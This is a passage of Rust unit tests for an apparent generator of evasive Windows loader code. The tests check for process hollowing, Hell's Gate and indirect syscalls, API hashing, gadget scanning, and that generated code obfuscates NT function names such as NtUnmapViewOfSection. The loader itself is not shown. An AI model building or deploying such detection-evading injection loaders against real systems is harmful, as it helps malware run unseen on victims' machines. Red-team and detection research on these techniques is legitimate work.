    fn api_hash_block_resolves_by_hash_not_name() {
        let block = render_block_with(
            &api_hash_config(),
            &hollowing_pipeline(),
            &xor_config(),
            &[],
            TEST_SEED,
        );

        // The resolver matches exports by a precomputed hash, so no NT name
        // string is emitted at all (not even obfuscated).
        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
        assert!(
            leaked.is_empty(),
            "cleartext NT names leaked outside comments: {leaked:?}"
        );
        assert!(block.contains("fn api_hash"), "hash function missing");
        assert!(block.contains("std::fs::read"), "clean-copy read missing");
        assert!(
            block.contains("fn export_rva_by_hash"),
            "hash export walker missing"
        );
        assert!(
            block.contains("resolve_ssn(&file, 0x4fe232be2dca3638)?;"),
            "the NtAllocateVirtualMemory hash constant is missing"
        );
        assert!(
            !block.contains("resolve_ssn(module, &"),
            "Hell's Gate resolution must not be emitted for api_hash"
        );
        assert!(
            !block.contains("resolve_ssn(&file, &"),
            "name-based file resolution must not be emitted for api_hash"
        );
        assert!(block.contains("global_asm"), "trampoline missing");
        assert!(block.contains("struct SsnTable"), "SSN table missing");
        assert!(block.contains("fn find_gadget"), "gadget scanner missing");
        assert!(!block.contains('$'), "leftover placeholders: {block}");
    }

    #[test]
    fn none_block_has_no_ssn_resolution() {
        let block = render_block_with(
            &SyscallsConfig::default(),
            &hollowing_pipeline(),
            &xor_config(),
            &[],
            TEST_SEED,
        );

        assert!(
            !block.contains("resolve_ssn"),
            "no SSN resolution in none mode"
        );
        assert!(!block.contains("global_asm"), "no trampoline in none mode");
        assert!(!block.contains("nt_invoke"), "no syscall in none mode");
        assert!(!block.contains("SsnTable"), "no SSN table in none mode");
        assert!(block.contains("VirtualAllocEx"), "direct call missing");
        assert!(block.contains("WriteProcessMemory"), "direct call missing");
        assert!(block.contains("ReadProcessMemory"), "direct call missing");
        assert!(block.contains("ResumeThread"), "direct call missing");
        assert!(block.contains("pub fn nt_alloc_vm"), "helper missing");
        assert!(!block.contains('$'), "leftover placeholders: {block}");
    }

    #[test]
    fn none_block_obfuscates_the_dynamic_unmap_names() {
        let block = render_block_with(
            &SyscallsConfig::default(),
            &hollowing_pipeline(),
            &xor_config(),
            &[],
            TEST_SEED,
        );
        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
        assert!(
            !leaked
                .iter()
                .any(|l| l == "NtUnmapViewOfSection" || l == "ntdll.dll"),
            "dynamic-resolution names leaked outside comments: {leaked:?}"
        );
    }

    #[test]
    fn empty_pipeline_renders_a_no_op_block() {
        let block = render_block_with(
            &indirect(),
            &sleep_pipeline(),
            &xor_config(),
            &[],
            TEST_SEED,
        );
        assert!(block.contains("fn init_syscalls"), "no-op init missing");
        assert!(
            !block.contains("global_asm"),
            "no machinery without requirements"
        );
        assert!(
            !block.contains("nt_alloc_vm"),
            "no helpers without requirements"
        );

        let none_block = render_block_with(
            &SyscallsConfig::default(),
            &[],
            &xor_config(),
            &[],
            TEST_SEED,
        );
        assert!(none_block.contains("fn init_syscalls"));
        assert!(!none_block.contains("VirtualAllocEx"));
    }

    #[test]
    fn stack_strategy_obfuscates_names_without_dec_xor() {
        let stack = StringsConfig {
            strategy: StringStrategy::Stack,
            key: None,
        };
        let block = render_block_with(&indirect(), &hollowing_pipeline(), &stack, &[], TEST_SEED);
        assert!(!block.contains("dec_xor"), "stack must not use dec_xor");
        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
        assert!(
            leaked.is_empty(),
            "cleartext names leaked outside comments: {leaked:?}"
        );
        assert!(
            block.contains("std::hint::black_box"),
            "stack stores missing"
        );
    }
}
